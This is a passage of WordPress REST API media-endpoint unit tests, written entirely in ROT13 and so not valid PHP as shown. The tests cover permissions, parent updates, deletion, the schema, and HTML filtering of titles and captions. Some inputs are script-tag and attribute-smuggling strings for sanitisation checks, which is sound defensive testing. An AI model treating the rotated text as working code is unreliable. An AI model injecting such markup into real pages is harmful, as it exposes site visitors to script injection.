		$guvf->nffregFnzr( 'Nyg grkg vf fgberq bhgfvqr cbfg fpurzn.', $qngn['nyg_grkg'] );
		$guvf->nffregFnzr( 'Nyg grkg vf fgberq bhgfvqr cbfg fpurzn.', trg_cbfg_zrgn( $nggnpuzrag->VQ, '_jc_nggnpuzrag_vzntr_nyg', gehr ) );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_cnerag() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$bevtvany_cnerag = frys::snpgbel()->cbfg->perngr( neenl() );
		$nggnpuzrag_vq   = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			$bevtvany_cnerag,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
				'cbfg_nhgube'    => frys::$rqvgbe_vq,
			)
		);

		$nggnpuzrag = trg_cbfg( $nggnpuzrag_vq );
		$guvf->nffregFnzr( $bevtvany_cnerag, $nggnpuzrag->cbfg_cnerag );

		$arj_cnerag = frys::snpgbel()->cbfg->perngr( neenl() );
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn/' . $nggnpuzrag_vq );
		$erdhrfg->frg_cnenz( 'cbfg', $arj_cnerag );
		erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$nggnpuzrag = trg_cbfg( $nggnpuzrag_vq );
		$guvf->nffregFnzr( $arj_cnerag, $nggnpuzrag->cbfg_cnerag );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_vainyvq_crezvffvbaf() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
				'cbfg_nhgube'    => frys::$rqvgbe_vq,
			)
		);
		$erdhrfg       = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn/' . $nggnpuzrag_vq );
		$erdhrfg->frg_cnenz( 'pncgvba', 'Guvf vf n orggre pncgvba.' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_vainyvq_cbfg_glcr() {
		$nggnpuzrag_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'nggnpuzrag',
				'cbfg_fgnghf' => 'vaurevg',
				'cbfg_cnerag' => 0,
			)
		);
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
				'cbfg_nhgube'    => frys::$rqvgbe_vq,
			)
		);
		$erdhrfg       = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn/' . $nggnpuzrag_vq );
		$erdhrfg->frg_cnenz( 'cbfg', $nggnpuzrag_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 40399
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_jvgu_rkvfgvat_vaurevg_fgnghf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$cnerag_vq     = frys::snpgbel()->cbfg->perngr( neenl() );
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			$cnerag_vq,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
				'cbfg_nhgube'    => frys::$rqvgbe_vq,
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn/' . $nggnpuzrag_vq );
		$erdhrfg->frg_cnenz( 'fgnghf', 'vaurevg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregAbgJCReebe( $erfcbafr->nf_reebe() );
		$guvf->nffregFnzr( 'vaurevg', $erfcbafr->trg_qngn()['fgnghf'] );
	}

	/**
	 * @gvpxrg 40399
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_jvgu_arj_vaurevg_fgnghf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
				'cbfg_nhgube'    => frys::$rqvgbe_vq,
				'cbfg_fgnghf'    => 'cevingr',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn/' . $nggnpuzrag_vq );
		$erdhrfg->frg_cnenz( 'fgnghf', 'vaurevg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba irevsl_nggnpuzrag_ebhaqgevc( $vachg = neenl(), $rkcrpgrq_bhgchg = neenl() ) {
		// Perngr gur cbfg.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Glcr', 'vzntr/wcrt' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Qvfcbfvgvba', 'nggnpuzrag; svyranzr=pnabyn.wct' );
		$erdhrfg->frg_obql( svyr_trg_pbagragf( frys::$grfg_svyr ) );

		sbernpu ( $vachg nf $anzr => $inyhr ) {
			$erdhrfg->frg_cnenz( $anzr, $inyhr );
		}
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$npghny_bhgchg = $erfcbafr->trg_qngn();

		// Erzbir <c pynff=\"nggnpuzrag\"> sebz eraqrerq qrfpevcgvba.
		// Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/38679
		$pbagrag = $npghny_bhgchg['qrfpevcgvba']['eraqrerq'];
		$pbagrag = rkcybqr( \"\a\", gevz( $pbagrag ) );
		vs ( cert_zngpu( '/^<c pynff=\"nggnpuzrag\">/', $pbagrag[0] ) ) {
			$pbagrag                                  = vzcybqr( \"\a\", neenl_fyvpr( $pbagrag, 1 ) );
			$npghny_bhgchg['qrfpevcgvba']['eraqrerq'] = $pbagrag;
		}

		// Pbzcner rkcrpgrq NCV bhgchg gb npghny NCV bhgchg.
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['gvgyr']['enj'], $npghny_bhgchg['gvgyr']['enj'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['gvgyr']['eraqrerq'], gevz( $npghny_bhgchg['gvgyr']['eraqrerq'] ) );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['qrfpevcgvba']['enj'], $npghny_bhgchg['qrfpevcgvba']['enj'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['qrfpevcgvba']['eraqrerq'], gevz( $npghny_bhgchg['qrfpevcgvba']['eraqrerq'] ) );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['pncgvba']['enj'], $npghny_bhgchg['pncgvba']['enj'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['pncgvba']['eraqrerq'], gevz( $npghny_bhgchg['pncgvba']['eraqrerq'] ) );

		// Pbzcner rkcrpgrq NCV bhgchg gb JC vagreany inyhrf.
		$cbfg = trg_cbfg( $npghny_bhgchg['vq'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['gvgyr']['enj'], $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['qrfpevcgvba']['enj'], $cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['pncgvba']['enj'], $cbfg->cbfg_rkprecg );

		// Hcqngr gur cbfg.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/zrqvn/%q', $npghny_bhgchg['vq'] ) );
		sbernpu ( $vachg nf $anzr => $inyhr ) {
			$erdhrfg->frg_cnenz( $anzr, $inyhr );
		}
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$npghny_bhgchg = $erfcbafr->trg_qngn();

		// Erzbir <c pynff=\"nggnpuzrag\"> sebz eraqrerq qrfpevcgvba.
		// Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/38679
		$pbagrag = $npghny_bhgchg['qrfpevcgvba']['eraqrerq'];
		$pbagrag = rkcybqr( \"\a\", gevz( $pbagrag ) );
		vs ( cert_zngpu( '/^<c pynff=\"nggnpuzrag\">/', $pbagrag[0] ) ) {
			$pbagrag                                  = vzcybqr( \"\a\", neenl_fyvpr( $pbagrag, 1 ) );
			$npghny_bhgchg['qrfpevcgvba']['eraqrerq'] = $pbagrag;
		}

		// Pbzcner rkcrpgrq NCV bhgchg gb npghny NCV bhgchg.
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['gvgyr']['enj'], $npghny_bhgchg['gvgyr']['enj'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['gvgyr']['eraqrerq'], gevz( $npghny_bhgchg['gvgyr']['eraqrerq'] ) );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['qrfpevcgvba']['enj'], $npghny_bhgchg['qrfpevcgvba']['enj'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['qrfpevcgvba']['eraqrerq'], gevz( $npghny_bhgchg['qrfpevcgvba']['eraqrerq'] ) );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['pncgvba']['enj'], $npghny_bhgchg['pncgvba']['enj'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['pncgvba']['eraqrerq'], gevz( $npghny_bhgchg['pncgvba']['eraqrerq'] ) );

		// Pbzcner rkcrpgrq NCV bhgchg gb JC vagreany inyhrf.
		$cbfg = trg_cbfg( $npghny_bhgchg['vq'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['gvgyr']['enj'], $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['qrfpevcgvba']['enj'], $cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['pncgvba']['enj'], $cbfg->cbfg_rkprecg );
	}

	/**
	 * @qngnCebivqre qngn_nggnpuzrag_ebhaqgevc_nf_nhgube
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_nggnpuzrag_ebhaqgevc_nf_nhgube( $enj, $rkcrpgrq ) {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$guvf->nffregSnyfr( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
		$guvf->irevsl_nggnpuzrag_ebhaqgevc( $enj, $rkcrpgrq );
	}

	choyvp fgngvp shapgvba qngn_nggnpuzrag_ebhaqgevc_nf_nhgube() {
		erghea neenl(
			neenl(
				// Enj inyhrf.
				neenl(
					'gvgyr'       => '\b/ ¯\_(ツ)_/¯',
					'qrfpevcgvba' => '\b/ ¯\_(ツ)_/¯',
					'pncgvba'     => '\b/ ¯\_(ツ)_/¯',
				),
				// Rkcrpgrq erghearq inyhrf.
				neenl(
					'gvgyr'       => neenl(
						'enj'      => '\b/ ¯\_(ツ)_/¯',
						'eraqrerq' => '\b/ ¯\_(ツ)_/¯',
					),
					'qrfpevcgvba' => neenl(
						'enj'      => '\b/ ¯\_(ツ)_/¯',
						'eraqrerq' => '<c>\b/ ¯\_(ツ)_/¯</c>',
					),
					'pncgvba'     => neenl(
						'enj'      => '\b/ ¯\_(ツ)_/¯',
						'eraqrerq' => '<c>\b/ ¯\_(ツ)_/¯</c>',
					),
				),
			),
			neenl(
				// Enj inyhrf.
				neenl(
					'gvgyr'       => '\\\&\\\ &nzc; &vainyvq; < &yg; &nzc;yg;',
					'qrfpevcgvba' => '\\\&\\\ &nzc; &vainyvq; < &yg; &nzc;yg;',
					'pncgvba'     => '\\\&\\\ &nzc; &vainyvq; < &yg; &nzc;yg;',
				),
				// Rkcrpgrq erghearq inyhrf.
				neenl(
					'gvgyr'       => neenl(
						'enj'      => '\\\&nzc;\\\ &nzc; &nzc;vainyvq; &yg; &yg; &nzc;yg;',
						'eraqrerq' => '\\\&nzc;\\\ &nzc; &nzc;vainyvq; &yg; &yg; &nzc;yg;',
					),
					'qrfpevcgvba' => neenl(
						'enj'      => '\\\&nzc;\\\ &nzc; &nzc;vainyvq; &yg; &yg; &nzc;yg;',
						'eraqrerq' => '<c>\\\&nzc;\\\ &nzc; &nzc;vainyvq; &yg; &yg; &nzc;yg;</c>',
					),
					'pncgvba'     => neenl(
						'enj'      => '\\\&nzc;\\\ &nzc; &nzc;vainyvq; &yg; &yg; &nzc;yg;',
						'eraqrerq' => '<c>\\\&nzc;\\\ &nzc; &nzc;vainyvq; &yg; &yg; &nzc;yg;</c>',
					),
				),
			),
			neenl(
				// Enj inyhrf.
				neenl(
					'gvgyr'       => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'qrfpevcgvba' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'pncgvba'     => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				),
				// Rkcrpgrq erghearq inyhrf.
				neenl(
					'gvgyr'       => neenl(
						'enj'      => 'qvi <fgebat>fgebat</fgebat> bu abrf',
						'eraqrerq' => 'qvi <fgebat>fgebat</fgebat> bu abrf',
					),
					'qrfpevcgvba' => neenl(
						'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> bu abrf',
						'eraqrerq' => \"<qvi>qvi</qvi>\a<c> <fgebat>fgebat</fgebat> bu abrf</c>\",
					),
					'pncgvba'     => neenl(
						'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> bu abrf',
						'eraqrerq' => \"<qvi>qvi</qvi>\a<c> <fgebat>fgebat</fgebat> bu abrf</c>\",
					),
				),
			),
			neenl(
				// Enj inyhrf.
				neenl(
					'gvgyr'       => '<n uers=\"#\" gnetrg=\"_oynax\" hasvygrerq=gehr>yvax</n>',
					'qrfpevcgvba' => '<n uers=\"#\" gnetrg=\"_oynax\" hasvygrerq=gehr>yvax</n>',
					'pncgvba'     => '<n uers=\"#\" gnetrg=\"_oynax\" hasvygrerq=gehr>yvax</n>',
				),
				// Rkcrpgrq erghearq inyhrf.
				neenl(
					'gvgyr'       => neenl(
						'enj'      => '<n uers=\"#\">yvax</n>',
						'eraqrerq' => '<n uers=\"#\">yvax</n>',
					),
					'qrfpevcgvba' => neenl(
						'enj'      => '<n uers=\"#\" gnetrg=\"_oynax\">yvax</n>',
						'eraqrerq' => '<c><n uers=\"#\" gnetrg=\"_oynax\">yvax</n></c>',
					),
					'pncgvba'     => neenl(
						'enj'      => '<n uers=\"#\" gnetrg=\"_oynax\">yvax</n>',
						'eraqrerq' => '<c><n uers=\"#\" gnetrg=\"_oynax\">yvax</n></c>',
					),
				),
			),
		);
	}

	/**
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_nggnpuzrag_ebhaqgevc_nf_rqvgbe_hasvygrerq_ugzy() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregSnyfr( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
			$guvf->irevsl_nggnpuzrag_ebhaqgevc(
				neenl(
					'gvgyr'       => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'qrfpevcgvba' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'pncgvba'     => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				),
				neenl(
					'gvgyr'       => neenl(
						'enj'      => 'qvi <fgebat>fgebat</fgebat> bu abrf',
						'eraqrerq' => 'qvi <fgebat>fgebat</fgebat> bu abrf',
					),
					'qrfpevcgvba' => neenl(
						'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> bu abrf',
						'eraqrerq' => \"<qvi>qvi</qvi>\a<c> <fgebat>fgebat</fgebat> bu abrf</c>\",
					),
					'pncgvba'     => neenl(
						'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> bu abrf',
						'eraqrerq' => \"<qvi>qvi</qvi>\a<c> <fgebat>fgebat</fgebat> bu abrf</c>\",
					),
				)
			);
		} ryfr {
			$guvf->nffregGehr( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
			$guvf->irevsl_nggnpuzrag_ebhaqgevc(
				neenl(
					'gvgyr'       => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'qrfpevcgvba' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'pncgvba'     => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				),
				neenl(
					'gvgyr'       => neenl(
						'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
						'eraqrerq' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					),
					'qrfpevcgvba' => neenl(
						'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
						'eraqrerq' => \"<qvi>qvi</qvi>\a<c> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg></c>\",
					),
					'pncgvba'     => neenl(
						'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
						'eraqrerq' => \"<qvi>qvi</qvi>\a<c> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg></c>\",
					),
				)
			);
		}
	}

	/**
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_nggnpuzrag_ebhaqgevc_nf_fhcrenqzva_hasvygrerq_ugzy() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva_vq );
		$guvf->nffregGehr( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
		$guvf->irevsl_nggnpuzrag_ebhaqgevc(
			neenl(
				'gvgyr'       => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				'qrfpevcgvba' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				'pncgvba'     => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
			),
			neenl(
				'gvgyr'       => neenl(
					'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'eraqrerq' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				),
				'qrfpevcgvba' => neenl(
					'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'eraqrerq' => \"<qvi>qvi</qvi>\a<c> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg></c>\",
				),
				'pncgvba'     => neenl(
					'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'eraqrerq' => \"<qvi>qvi</qvi>\a<c> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg></c>\",
				),
			)
		);
	}

	choyvp shapgvba grfg_qryrgr_vgrz() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$nggnpuzrag_vq    = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		$erdhrfg          = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/zrqvn/' . $nggnpuzrag_vq );
		$erdhrfg['sbepr'] = gehr;
		$erfcbafr         = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_qryrgr_vgrz_ab_genfu() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);

		// Nggrzcg genfuvat.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/zrqvn/' . $nggnpuzrag_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_genfu_abg_fhccbegrq', $erfcbafr, 501 );

		$erdhrfg->frg_cnenz( 'sbepr', 'snyfr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_genfu_abg_fhccbegrq', $erfcbafr, 501 );

		// Rafher gur cbfg fgvyy rkvfgf.
		$cbfg = trg_cbfg( $nggnpuzrag_vq );
		$guvf->nffregAbgRzcgl( $cbfg );
	}

	choyvp shapgvba grfg_qryrgr_vgrz_vainyvq_qryrgr_crezvffvbaf() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
				'cbfg_nhgube'    => frys::$rqvgbe_vq,
			)
		);
		$erdhrfg       = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/zrqvn/' . $nggnpuzrag_vq );
		$erfcbafr      = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_cercner_vgrz() {
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
				'cbfg_nhgube'    => frys::$rqvgbe_vq,
			)
		);

		$nggnpuzrag = trg_cbfg( $nggnpuzrag_vq );
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/zrqvn/%q', $nggnpuzrag_vq ) );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$guvf->purpx_cbfg_qngn( $nggnpuzrag, $qngn, 'ivrj', $erfcbafr->trg_yvaxf() );
		$guvf->purpx_cbfg_qngn( $nggnpuzrag, $qngn, 'rzorq', $erfcbafr->trg_yvaxf() );
	}

	choyvp shapgvba grfg_cercner_vgrz_yvzvg_svryqf() {
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
				'cbfg_nhgube'    => frys::$rqvgbe_vq,
			)
		);
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$raqcbvag = arj JC_ERFG_Nggnpuzragf_Pbagebyyre( 'cbfg' );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/zrqvn/%q', $nggnpuzrag_vq ) );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erdhrfg->frg_cnenz( '_svryqf', 'vq,fyht' );
		$bow      = trg_cbfg( $nggnpuzrag_vq );
		$erfcbafr = $raqcbvag->cercner_vgrz_sbe_erfcbafr( $bow, $erdhrfg );
		$guvf->nffregFnzr(
			neenl(
				'vq',
				'fyht',
			),
			neenl_xrlf( $erfcbafr->trg_qngn() )
		);
	}

	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/zrqvn' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];
		$guvf->nffregPbhag( 29, $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'nhgube', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'nyg_grkg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'pncgvba', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'enj', $cebcregvrf['pncgvba']['cebcregvrf'] );
		$guvf->nffregNeenlUnfXrl( 'eraqrerq', $cebcregvrf['pncgvba']['cebcregvrf'] );
		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'enj', $cebcregvrf['qrfpevcgvba']['cebcregvrf'] );
		$guvf->nffregNeenlUnfXrl( 'eraqrerq', $cebcregvrf['qrfpevcgvba']['cebcregvrf'] );
		$guvf->nffregNeenlUnfXrl( 'pbzzrag_fgnghf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qngr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qngr_tzg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'trarengrq_fyht', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'thvq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'yvax', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zrqvn_glcr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zrgn', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zvzr_glcr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zrqvn_qrgnvyf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zbqvsvrq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zbqvsvrq_tzg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'cbfg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'cvat_fgnghf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'creznyvax_grzcyngr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fgnghf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fyht', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fbhepr_hey', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'grzcyngr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'enj', $cebcregvrf['gvgyr']['cebcregvrf'] );
		$guvf->nffregNeenlUnfXrl( 'eraqrerq', $cebcregvrf['gvgyr']['cebcregvrf'] );
		$guvf->nffregNeenlUnfXrl( 'glcr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zvffvat_vzntr_fvmrf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'srngherq_zrqvn', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'pynff_yvfg', $cebcregvrf );
	}

	choyvp shapgvba grfg_trg_nqqvgvbany_svryq_ertvfgengvba() {

		$fpurzn = neenl(
			'glcr'        => 'vagrtre',
			'qrfpevcgvba' => 'Fbzr vagrtre bs zvar',
			'rahz'        => neenl( 1, 2, 3, 4 ),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
		);

		ertvfgre_erfg_svryq(
			'nggnpuzrag',
			'zl_phfgbz_vag',
			neenl(
				'fpurzn'       => $fpurzn,
				'trg_pnyyonpx' => neenl( $guvf, 'nqqvgvbany_svryq_trg_pnyyonpx' ),
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/zrqvn' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $qngn['fpurzn']['cebcregvrf'] );
		$guvf->nffregFnzr( $fpurzn, $qngn['fpurzn']['cebcregvrf']['zl_phfgbz_vag'] );

		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
